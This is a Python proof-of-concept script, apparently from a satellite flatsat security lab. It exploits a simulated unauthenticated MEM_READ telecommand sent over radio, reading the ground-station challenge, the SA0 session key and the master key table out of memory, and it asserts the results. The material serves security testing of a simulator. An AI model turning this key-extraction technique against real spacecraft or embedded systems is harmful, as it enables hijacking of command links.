#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-05  Unauthenticated MEM_READ: arbitrary in-bounds read of SRAM, XIP,
# peripherals. Session keys and the whole SDLS key table walk out.
# SPARTA: CR-0002 / CT-0001.01
def main(dev, ev):
    def read(addr, ln):
        return dev.tc(0x19, struct.pack("<IH", addr, ln), via="radio")
    # live GS challenge straight from RAM
    dev.tc(0x12, b"\x00", via="radio")               # generate a challenge
    mr = dev.find(read(fs.SYM_GS_CHALLENGE, 4), 0x19)[0]
    chal = mr.le32(7)
    ev.log(f"MEM_READ 0x{fs.SYM_GS_CHALLENGE:08X} -> challenge 0x{chal:08X}")
    # SA0 session key
    mr = dev.find(read(fs.SYM_SA0_KEY, 16), 0x19)[0]
    key = mr.payload[7:23]
    ev.log(f"MEM_READ sa0_key -> {key.hex()} == link key: {key == fs.LINK_KEY}")
    check(key == fs.LINK_KEY, "SA0 key readable in one TC")
    # master key table: 128 slots all-zero (V-10 setup)
    mr = dev.find(read(fs.SYM_MASTER_KEYS, 16), 0x19)[0]
    check(mr.payload[7:23] == bytes(16), "master key 0 is null")
    ev.log("master key table base 0x20003000: all-zero master keys confirmed")
    # fault on bad requests
    bad = read(fs.SYM_SA0_KEY, 300)
    check(dev.err_text(bad) == "MEM READ FAULT", "length>200 faults")
    bad = read(0x00000000, 8)
    check(dev.err_text(bad) == "MEM READ FAULT", "address out of map faults")
    ev.log("=> crypto material inventory complete from the raw radio")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-05 arbitrary MEM_READ", main))
